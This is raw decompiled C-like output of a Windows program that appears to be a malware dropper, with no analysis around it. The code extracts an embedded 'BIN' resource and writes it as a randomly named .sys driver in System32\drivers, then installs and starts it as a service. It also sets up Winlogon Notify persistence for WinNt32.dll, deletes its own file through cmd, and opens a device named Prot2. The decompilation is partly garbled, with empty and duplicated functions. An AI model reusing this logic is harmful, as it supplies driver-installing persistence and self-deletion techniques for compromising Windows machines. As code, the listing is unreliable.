// Generated by Rec Studio 4 - build Apr 15 2012

L08001340(
    _unknown_ __ecx,                       // r2
    signed int* _a4,                       // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    signed int* _v8;                       // _cfa_fffffff8
    _unknown_ __ebp;                       // r6
    signed int _t28;                       // _t28

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _t28 = _a12 - 1;
        _a12 = _t28;
        if(_a12 == 0) {
            break;
        }
         *_a4 = _t28 & 255;
        _a4 =  &(_a4[0]);
        _a8 = _a8 + 1;
    }
    return _v8;
}

L08001390(
    _unknown_ __ecx,                       // r2
    signed int* _a4,                       // _cfa_4
    _unknown_ _a8,                         // _cfa_8
    signed int _a12                        // _cfa_c
)
{
    signed int* _v8;                       // _cfa_fffffff8
    _unknown_ __ebp;                       // r6
    signed int _t19;                       // _t19

    _push(__ecx);
    _v8 = _a4;
    while(1) {
        _t19 = _a12;
        _a12 = _a12 - 1;
        if(_t19 == 0) {
            break;
        }
         *_a4 = _t19 & 255;
        _a4 =  &(_a4[0]);
    }
    return _v8;
}

L080013D0(
    _unknown_ __eax,                       // r0
    long _a4                               // _cfa_4
)
{
    _unknown_ __ebp;                       // r6
    _unknown_ _t2;                         // _t2
    _unknown_ _t3;                         // _t3

    if( *134230024 == 0) {
         *134230024 = GetProcessHeap();
    }
    if( *134230024 == 0) {
        return 0;
    }
    return HeapAlloc( *134230024, 0, _a4);
}

L08001420(
    void* _a4             // _cfa_4
)
{
    _unknown_ __ebp;                       // r6
    _unknown_ _t2;                         // _t2
    _unknown_ _t4;                         // _t4

    if( *134230024 != 0) {
        HeapFree( *134230024, 0, _a4);
        return;
    }
    return;
}

L08001450()
{
    _unknown_ _t21;                        // _t21
    _unknown_ _t22;                        // _t22
    _unknown_ _t24;                        // _t24
    _unknown_ _t25;                        // _t25
    _unknown_ _t27;                        // _t27

L1:
     *((char*)(__ebp + lstrlenA(__ebp + -632) + -634)) = 0;
     *((intOrPtr*)(__ebp + -292)) = __ebp + -631;
    goto L2;
L2:
    if(GetShortPathNameA( *((intOrPtr*)(__ebp + -292)),  *((intOrPtr*)(__ebp + -292)), 260) != 0) {
L3:
        lstrcpyA(__ebp + -272, (char*)("/c del "));
        lstrcatA(__ebp + -272,  *((intOrPtr*)(__ebp + -292)));
        lstrcatA(__ebp + -272, (char*)(" >> NUL"));
        GetEnvironmentVariableA((char*)("ComSpec"),  *((intOrPtr*)(__ebp + -292)), 260);
        if(CreateProcessA( *((intOrPtr*)(__ebp + -292)), __ebp + -272, 0, 0, 0, 134217728, 0, 0, __ebp + -368, __ebp + -288) != 0) {
L4:
            ExitProcess(0);
        }
    }
L5:
    L08001FF8( *((intOrPtr*)(__ebp - 4)) ^ __ebp);
    _pop(__ebp);
    return;
L6:
}

L080015A0(
    struct HINSTANCE__* _a4,   // _cfa_4
    signed short _a8,                      // _cfa_8
    CHAR* _a12,           // _cfa_c
    long* _a16                             // _cfa_10
)
{
    struct HRSRC__* _v8;   // _cfa_fffffff8
    long _v12;                             // _cfa_fffffff4
    struct HRSRC__* _v16;   // _cfa_fffffff0
    void* _v20;           // _cfa_ffffffec
    void* _v24;           // _cfa_ffffffe8
    _unknown_ __ebp;                       // r6
    _unknown_ _t36;                        // _t36
    _unknown_ _t40;                        // _t40

    _v16 = 0;
    _v8 = 0;
    if(_a8 == 0) {
        if(_a12 != 0) {
            _v8 = FindResourceA(_a4, _a12, "BIN");
        }
    } else {
        _v8 = FindResourceA(_a4, _a8 & 65535, "BIN");
    }
    _v20 = LoadResource(_a4, _v8);
    _v12 = SizeofResource(_a4, _v8);
    if(_v20 != 0) {
        _v24 = LockResource(_v20);
        if(_v24 != 0) {
             *_a16 = _v12;
            _v16 = L080013D0(_a16, _v12);
            L08001340(_v24, _v16, _v24, _v12);
        }
        FreeResource(_v20);
    }
    return _v16;
}

L08001670(
    _unknown_ __ecx,                       // r2
    CHAR* _a4,            // _cfa_4
    void* _a8,            // _cfa_8
    long _a12                              // _cfa_c
)
{
    void* _v8;            // _cfa_fffffff8
    _unknown_ __ebp;                       // r6
    _unknown_ _t11;                        // _t11
    _unknown_ _t15;                        // _t15
    _unknown_ _t16;                        // _t16
    _unknown_ _t17;                        // _t17

    _push(__ecx);
    if(_a8 == 0 || _a12 == 0) {
L4:
        return 0;
    } else {
        _v8 = CreateFileA(_a4, 1073741824, 0, 0, 2, 128, 0);
        if(_v8 == 255) {
            goto L4;
        }
        WriteFile(_v8, _a8, _a12,  &_a12, 0);
        CloseHandle(_v8);
        return 1;
    }
    return __eax;
}

L080016E0()
{
    intOrPtr _v12;                         // _cfa_fffffff4
    _unknown_ __ebp;                       // r6
    _unknown_ _t4;                         // _t4

    QueryPerformanceCounter( &_v12);
    return _v12;
}

L08001700(
    _unknown_ __eax,                       // r0
    CHAR* _a4,            // _cfa_4
    CHAR* _a8             // _cfa_8
)
{
    _unknown_ __ebp;                       // r6
    _unknown_ _t57;                        // _t57
    signed int _t58;                       // _t58
    _unknown_ _t60;                        // _t60
    signed int _t62;                       // _t62
    _unknown_ _t64;                        // _t64
    signed int _t66;                       // _t66
    _unknown_ _t68;                        // _t68
    signed int _t70;                       // _t70
    _unknown_ _t72;                        // _t72
    signed int _t74;                       // _t74
    _unknown_ _t76;                        // _t76
    _unknown_ _t78;                        // _t78
    _unknown_ _t80;                        // _t80
    _unknown_ _t81;                        // _t81
    _unknown_ _t83;                        // _t83
    _unknown_ _t84;                        // _t84
    _unknown_ _t85;                        // _t85
    _unknown_ _t86;                        // _t86
    _unknown_ _t87;                        // _t87
    _unknown_ _t88;                        // _t88

    _t58 = L080016E0();
    asm("cdq ");
     *_a8 = (_t58 & 0xffff) % 25 + 65 & 255;
    _t62 = L080016E0();
    asm("cdq ");
    _a8[1] = (_t62 & 0xffff) % 25 + 97 & 255;
    _t66 = L080016E0();
    asm("cdq ");
    _a8[2] = (_t66 & 0xffff) % 25 + 97 & 255;
    _t70 = L080016E0();
    asm("cdq ");
    _a8[3] = (_t70 & 0xffff) % 9 + 48 & 255;
    _t74 = L080016E0();
    asm("cdq ");
    _a8[4] = (_t74 & 0xffff) % 9 + 48 & 255;
    _a8[5] = 0;
    GetEnvironmentVariableA("SystemRoot", _a4, 260);
    lstrcatA(_a4, "\System32\drivers\");
    lstrcatA(_a4, _a8);
    lstrcatA(_a4, ".sys");
    return;
}

L080017E0(
    CHAR* _a4             // _cfa_4
)
{
    _unknown_ __ebp;                       // r6
    _unknown_ _t4;                         // _t4
    _unknown_ _t5;                         // _t5

    GetEnvironmentVariableA("SystemRoot", _a4, 260);
    lstrcatA(_a4, "\System32\WinNt32.dll");
    return;
}

L08001820(
    _unknown_ __eax,                       // r0
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    void* _v8;                             // _cfa_fffffff8
    intOrPtr _v12;                         // _cfa_fffffff4
    long _v16;                             // _cfa_fffffff0
    void* _v20;           // _cfa_ffffffec
    _unknown_ __ebp;                       // r6
    _unknown_ _t21;                        // _t21
    _unknown_ _t28;                        // _t28

    _v12 = 1;
    _push(983103);
    _push(0);
    _push(0);
    _v20 = OpenSCManagerA();
    _push(983551);
    _push(_a8);
    _push(_v20);
    _v8 = OpenServiceA();
    if(_v8 == 0) {
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(0);
        _push(_a4);
        _push(0);
        _push(3);
        _push(1);
        _push(983551);
        _push(0);
        _push(_a8);
        _push(_v20);
        _v8 = CreateServiceA();
    }
    if(_v8 == 0) {
L5:
        _v16 = GetLastError();
        if(_v16 != 1056) {
            _v12 = 0;
        } else {
            _v12 = 1;
        }
L8:
        if(_v8 != 0) {
            CloseServiceHandle(_v8);
        }
        return _v12;
    }
    _push(0);
    _push(0);
    _push(_v8);
    if(StartServiceA() == 0) {
        goto L5;
    }
    _v12 = 1;
    goto L8;
}

L080018F0()
{
}

L08001A00()
{
}

L08001BA0()
{
    char _v8;                              // _cfa_fffffff8
    void* _v12;           // _cfa_fffffff4
    CHAR* _v16;           // _cfa_fffffff0
    CHAR* _v20;           // _cfa_ffffffec
    char _v24;                             // _cfa_ffffffe8
    _unknown_ __ebp;                       // r6
    _unknown_ _t18;                        // _t18
    _unknown_ _t22;                        // _t22
    _unknown_ _t26;                        // _t26
    _unknown_ _t27;                        // _t27
    _unknown_ _t29;                        // _t29
    _unknown_ _t30;                        // _t30

    _v20 = "WinNt32.dll";
    _v16 = "WLEventStartShell";
    _v8 = 0;
    _v24 = 0;
    _push( &_v12);
    _push("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\WinNt32");
    _push(-2147483646);
    RegCreateKeyA();
    _push(lstrlenA(_v20) + 1);
    _push(_v20);
    _push(1);
    _push(0);
    _push("DLLName");
    _push(_v12);
    RegSetValueExA();
    _push(lstrlenA(_v16) + 1);
    _push(_v16);
    _push(1);
    _push(0);
    _push("StartShell");
    _push(_v12);
    RegSetValueExA();
    _push(4);
    _push( &_v8);
    _push(4);
    _push(0);
    _push("Impersonate");
    _push(_v12);
    RegSetValueExA();
    _push(4);
    _push( &_v24);
    _push(4);
    _push(0);
    _push("Asynchronous");
    _push(_v12);
    RegSetValueExA();
    RegCloseKey(_v12);
    return;
}

L08001C70()
{
    _unknown_ __ebp;                       // r6

    CreateFileA("\\.\Prot2", -1073741824, 0, 0, 2, 128, 0);
    return;
}

L08001FF8(
    _unknown_ __ecx                        // r2
)
{
    __ecx = __ecx;
    if(__ecx ==  *134230016) {
        asm("rep ret ");
    }
}

L08001FF8(
    _unknown_ __ecx                        // r2
)
{
    __ecx = __ecx;
    if(__ecx ==  *134230016) {
        asm("rep ret ");
    }
}

// Statistics:
//       7 Register nodes
//      16 Temporaries nodes
//       0 Casts
//     409 Statements
//      12 Labels
//       3 Gotos
//      18 Blocks
//     627 Nodes
//       6 Assembly nodes
//      61 Unknown Types


Total time: 0 seconds.
